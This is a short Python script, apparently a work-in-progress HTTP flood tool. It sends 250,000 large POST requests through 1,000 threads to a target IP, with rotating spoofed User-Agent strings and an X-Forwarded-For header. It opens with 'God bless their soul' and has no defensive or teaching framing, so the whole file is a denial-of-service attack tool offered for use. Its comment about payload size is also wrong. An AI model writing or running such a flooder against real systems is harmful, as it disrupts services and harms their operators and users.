# WORK IN PROGRESS | requires a decent computer
import requests
import random
import time
import concurrent.futures

print("God bless their soul")

target_ip = "0.0.0.0"  # Replace with the target
num_requests = 250000
delay_between_requests = 0.01

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:44.0) Gecko/20100101 Firefox/44.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
]

def rotate_ua():
    user_agent = random.choice(user_agents)
    return user_agent

def send_request(i):
    user_agent = rotate_ua()
    headers = {
        "User-Agent": user_agent,
        "X-Forwarded-For": target_ip
    }
    payload = "A" * 1024 * 13024  # 1MB payload
    try:
        response = requests.post(f"http://{target_ip}", headers=headers, data=payload)
        print(f"Request '{i+1}': User-Agent '{user_agent}' and from '{target_ip}'")
    except requests.exceptions.RequestException as e:
        print(f"Error message: {e}")

with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    futures = [executor.submit(send_request, i) for i in range(num_requests)]
    for future in concurrent.futures.as_completed(futures):
        future.result()

print("Done!")
